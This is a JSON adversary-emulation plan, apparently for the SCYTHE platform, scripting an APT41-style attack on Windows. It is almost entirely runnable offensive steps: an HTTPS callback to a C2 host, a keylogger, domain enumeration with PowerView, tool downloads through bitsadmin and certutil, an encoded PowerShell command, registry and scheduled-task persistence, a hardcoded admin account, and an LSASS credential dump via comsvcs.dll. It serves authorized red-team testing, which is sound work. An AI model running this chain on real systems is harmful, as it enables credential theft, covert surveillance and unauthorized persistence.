@@ -1,0 +1,482 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "APT41 Adversary Emulations as documented by: https://security-tzu.com/2020/09/23/emulation-plan-for-apt41/",
+        "display_name": "APT41",
+        "name": "APT41",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": {
+                    "--cp": "unicorn.scythedemo.com:443",
+                    "--secure": true
+                },
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "name": "remote_server",
+                "type": "assign",
+                "value": "BLANK"
+            },
+            "2": {
+                "module": "loader",
+                "module_to_load": "keylogger",
+                "request": "--load keylogger",
+                "type": "message"
+            },
+            "3": {
+                "depends_on": "8085957f-b422-48cb-960b-1f077790299d",
+                "module": "keylogger",
+                "request": "--start",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1056"
+                ],
+                "type": "message"
+            },
+            "4": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "module": "loader",
+                "module_to_load": "upsh",
+                "request": "--load upsh",
+                "rtags": [
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c mkdir \"%USERPROFILE%\\Desktop\\APT41\"",
+                "rtags": [
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "DISCOVERY"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "whoami",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "10": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "ipconfig /all",
+                "rtags": [
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "netstat -ant",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1049"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "netstat -r",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1049"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/APT41/PowerView.ps1\" --dest \"%USERPROFILE%\\Desktop\\APT41\\PowerView.ps1\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "run",
+                "request": "powershell.exe -exec bypass -Command \"&{Import-Module %USERPROFILE%\\Desktop\\APT41\\PowerView.ps1;Get-NetRDPSession}\"",
+                "rtags": [
+                    "att&ck-technique:T1049"
+                ],
+                "type": "message"
+            },
+            "15": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c net share",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1135"
+                ],
+                "type": "message"
+            },
+            "16": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "run",
+                "request": "powershell.exe -exec bypass -Command \"&{Import-Module %USERPROFILE%\\Desktop\\APT41\\PowerView.ps1;Get-NetShare}\"",
+                "rtags": [
+                    "att&ck-technique:T1049"
+                ],
+                "type": "message"
+            },
+            "17": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe -exec bypass -Command \"&{Import-Module %USERPROFILE%\\Desktop\\APT41\\PowerView.ps1;Get-Forest}\"",
+                "rtags": [
+                    "att&ck-technique:T1046"
+                ],
+                "type": "message"
+            },
+            "18": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe -exec bypass -Command \"&{Import-Module %USERPROFILE%\\Desktop\\APT41\\PowerView.ps1;Get-ForestDomain}\"",
+                "rtags": [
+                    "att&ck-technique:T1046"
+                ],
+                "type": "message"
+            },
+            "19": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe -exec bypass -Command \"&{Import-Module %USERPROFILE%\\Desktop\\APT41\\PowerView.ps1;Get-Domain}\"",
+                "rtags": [
+                    "att&ck-technique:T1046"
+                ],
+                "type": "message"
+            },
+            "20": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe -exec bypass -Command \"&{Import-Module %USERPROFILE%\\Desktop\\APT41\\PowerView.ps1;Get-DomainTrust}\"",
+                "rtags": [
+                    "att&ck-technique:T1046"
+                ],
+                "type": "message"
+            },
+            "21": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe -exec bypass -Command \"&{Import-Module %USERPROFILE%\\Desktop\\APT41\\PowerView.ps1;Get-DomainTrustMapping}\"",
+                "rtags": [
+                    "att&ck-technique:T1046"
+                ],
+                "type": "message"
+            },
+            "22": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c nltest /domain_trusts > %USERPROFILE%\\Desktop\\APT41\\ad_trustdmp.txt",
+                "rtags": [
+                    "att&ck-technique:T1482"
+                ],
+                "type": "message"
+            },
+            "23": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c net group \"Domain Admins\" /do",
+                "rtags": [
+                    "att&ck",
+                    "att&ck-technique:T1069.002"
+                ],
+                "type": "message"
+            },
+            "24": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Execution"
+            },
+            "25": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell -exec bypass -nop -enc dwBoAG8AYQBtAGkA",
+                "rtags": [
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            },
+            "26": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/APT41/WmiExec.ps1\" --dest \"%USERPROFILE%\\Desktop\\APT41\\WmiExec.ps1\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "27": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c wmic useraccount get /ALL /format:csv",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0002",
+                    "att&ck-technique:T1047"
+                ],
+                "type": "message"
+            },
+            "28": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "DEFENSE EVASION"
+            },
+            "29": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "bitsadmin /transfer bbbb https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1 %USERPROFILE%\\Desktop\\APT41\\ASREPRoast.ps1",
+                "rtags": [
+                    "att&ck-technique:T1197"
+                ],
+                "type": "message"
+            },
+            "30": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "certutil -urlcache -split -f https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1 %USERPROFILE%\\Desktop\\APT41\\SharpHound.ps1",
+                "rtags": [
+                    "att&ck-technique:T1202"
+                ],
+                "type": "message"
+            },
+            "31": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "PERSISTENCE"
+            },
+            "32": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c REG ADD HKEY_CURRENT_USER\\Software\\ExampleRegKey /v Example /d \"Example Data\" /f",
+                "rtags": [
+                    "att&ck-technique:T1547.001"
+                ],
+                "type": "message"
+            },
+            "33": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c REG QUERY HKEY_CURRENT_USER\\Software\\ExampleRegKey",
+                "rtags": [
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "34": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c SCHTASKS /CREATE /SC DAILY /TN \"MyTasks\\Example Task\" /TR \"C:\\example_service.exe\" /ST 11:00 /F",
+                "rtags": [
+                    "att&ck-technique:T1053"
+                ],
+                "type": "message"
+            },
+            "35": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c SCHTASKS /QUERY /TN \"MyTasks\\Example Task\"",
+                "rtags": [
+                    "att&ck-technique:T1053.005"
+                ],
+                "type": "message"
+            },
+            "36": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "rtags": [
+                    "att&ck-technique:T1069"
+                ],
+                "type": "message"
+            },
+            "37": {
+                "function": "ifelse",
+                "next": 47,
+                "step": 36,
+                "type": "decision",
+                "value": "High",
+                "verb": "does not contain"
+            },
+            "38": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net user APT41 Passw0rd! /add",
+                "rtags": [
+                    "att&ck-technique:T1136"
+                ],
+                "type": "message"
+            },
+            "39": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net localgroup Administrators APT41 /add",
+                "rtags": [
+                    "att&ck-technique:T1136.001"
+                ],
+                "type": "message"
+            },
+            "40": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net user",
+                "rtags": [
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "41": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CREDENTIAL ACCESS"
+            },
+            "42": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0006",
+                    "att&ck-technique:T1003.001"
+                ],
+                "type": "message"
+            },
+            "43": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {Remove-Item $env:TEMP\\lsass-comsvcs.dmp -ErrorAction Ignore\n}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0006",
+                    "att&ck-technique:T1003.001",
+                    "cleanup"
+                ],
+                "type": "message"
+            },
+            "44": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CLEAN UP"
+            },
+            "45": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net localgroup Administrators APT41 /del",
+                "type": "message"
+            },
+            "46": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net user APT41 /del",
+                "rtags": [
+                    "att&ck-technique:T1136"
+                ],
+                "type": "message"
+            },
+            "47": {
+                "depends_on": "8085957f-b422-48cb-960b-1f077790299d",
+                "module": "keylogger",
+                "request": "--current",
+                "rtags": [
+                    "att&ck-technique:T1056.001"
+                ],
+                "type": "message"
+            },
+            "48": {
+                "depends_on": "8085957f-b422-48cb-960b-1f077790299d",
+                "module": "keylogger",
+                "request": "--stop",
+                "rtags": [
+                    "att&ck-technique:T1056.001"
+                ],
+                "type": "message"
+            },
+            "49": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c REG DELETE HKEY_CURRENT_USER\\Software\\ExampleRegKey /f",
+                "rtags": [
+                    "att&ck-technique:T1112",
+                    "att&ck-technique:T1547.001"
+                ],
+                "type": "message"
+            },
+            "50": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c SCHTASKS /DELETE /TN \"MyTasks\\Example Task\" /F",
+                "rtags": [
+                    "att&ck-technique:T1053.005"
+                ],
+                "type": "message"
+            },
+            "51": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c rmdir /Q /S \"\"%USERPROFILE%\\Desktop\\APT41\"\"",
+                "rtags": [
+                    "att&ck-technique:T1485"
+                ],
+                "type": "message"
+            },
+            "52": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
